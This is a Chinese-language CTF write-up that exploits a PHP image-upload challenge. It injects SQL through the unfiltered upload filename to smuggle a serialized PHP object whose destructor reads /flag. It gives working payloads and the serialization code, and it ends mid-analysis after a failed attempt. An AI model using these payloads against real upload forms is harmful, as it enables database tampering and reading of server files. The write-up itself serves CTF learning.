这里面的重要利用点是下面的几句代码

$fileinfo = $this->getfile($input);

$rs = $this->check($_FILES[$input]);

$title = str_replace(".".$ext,'',$filename);
	return array('title'=>$title,'filename'=>$basename.".".$ext,'ext'=>$ext,'path'=>$this->folder.$basename.".".$ext);

$title就是没有后缀名的文件名，并且很明显没有做任何过滤。再看对数据库的操作。
$sql_fields = array();
$sql_val = array();
foreach($data as $key=>$value){
	$key_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $key);
	$value_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $value);
	$sql_fields[] = "`".$key_temp."`";
	$sql_val[] = "'".$value_temp."'";
}
$sql = "INSERT INTO images (".(implode(",",$sql_fields)).") VALUES(".(implode(",",$sql_val)).")";

上面的foreach好像是将\0\0\0替换为了chr(0)*chr(0)，而后面的代替又将attr中的chr(0)*chr(0)变成了\0\0\0，正常的sql语句是
INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES('TIM截图20191102114857','f20c76cc4fb41838.jpg','jpg','pic/f20c76cc4fb41838.jpg','a:2:{s:5:"width";i:1264;s:6:"height";i:992;}')

由于title可由我们控制，没有处理，可以直接换成1','1','1','1','a:2:{s:5:"width";i:1264;s:6:"height";i:992;}')#.jpg，后面的反序列化后的内容就可由我们进行改变了，触发的时候，由于销毁前执行析构函数，从而有调用到view_files()函数执行危险函数file_get_contents();，故php的序列化内容应为
<?php
class helper {
    protected $ifview = TRUE; 
	protected $config = "/flag";
}
$a = new helper();
echo serialize($a);
# O:6:"helper":2:{s:9:"*ifview";b:1;s:9:"*config";s:5:"/flag";}
?>

然后就是这里的protected变量的*被替换掉了的问题，就把*变成\0\0\0就行了，就是
1','1','1','1','O:6:"helper":2:{s:9:"\0\0\0ifview";b:1;s:9:"\0\0\0config";s:5:"/flag";}')#.jpg

试试先，bp抓包改filename，emmm双引号会被提前截断，可换成单引号
1','1','1','1','O:6:"helper":2:{s:9:"\0\0\0ifview";b:1;s:9:"\0\0\0config";s:5:"/flag";}')#.jpg

显示something wrong，显然是因为我们的格式不对从而触发了该点
public function save($data)
